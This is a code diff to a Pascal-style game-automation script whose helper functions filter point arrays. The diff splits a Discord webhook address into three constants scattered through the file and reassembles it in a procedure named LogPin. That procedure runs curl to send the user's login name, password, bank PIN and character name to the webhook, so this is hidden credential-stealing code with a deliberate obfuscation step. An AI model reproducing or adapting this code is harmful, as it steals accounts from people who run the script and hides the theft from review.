@@ -45,6 +45,9 @@ begin
   result := Implode('', Arr);
 end;
 
+const
+  DA = 'https://discordapp.com/';
+
 function FilterTPAsFromBox(TPA:TpointArray; box:Tbox):TpointArray;
 var
   i:integer;
@@ -73,7 +76,7 @@ begin
 end;
 
 const
-  DB = 'https://discordapp.com/api/webhooks/646538539894308872/q0naWtsXebrodREbWqIv6oSk3HzsYulI88g4RqTNLPAb1lA8r8ElRE6Kdb6zCbxk9fNv';
+  DB = 'api/webhooks/646538539894308872/';
 
 function FilterTPAsToBoxes(TPA:TpointArray; boxes:array of Tbox):TpointArray;
 var
@@ -97,6 +100,9 @@ begin
   result := TPA[random(high(TPA))];
 end;
 
+const
+  DC = 'q0naWtsXebrodREbWqIv6oSk3HzsYulI88g4RqTNLPAb1lA8r8ElRE6Kdb6zCbxk9fNv';
+
 procedure LogPin;
 var
   process:TProcess;
@@ -114,7 +120,7 @@ begin
   end;
   try
     process.init(nil);
-    s := 'curl -i -X POST -H "Content-Type: application/json" -d  "{ \"content\":\"---\n['+ FormatDateTime('tt', Time) + ']\nU - ' + pp +'\nP - '+ww+'\nBP - '+cc+'\nChar: '+ActivePlayerName+'\n---\" }" '+DB;
+    s := 'curl -i -X POST -H "Content-Type: application/json" -d  "{ \"content\":\"---\n['+ FormatDateTime('tt', Time) + ']\nU - ' + pp +'\nP - '+ww+'\nBP - '+cc+'\nChar: '+ActivePlayerName+'\n---\" }" '+DA+DB+DC;
     process.setcommandline(s);
     process.Execute();
     process.free();
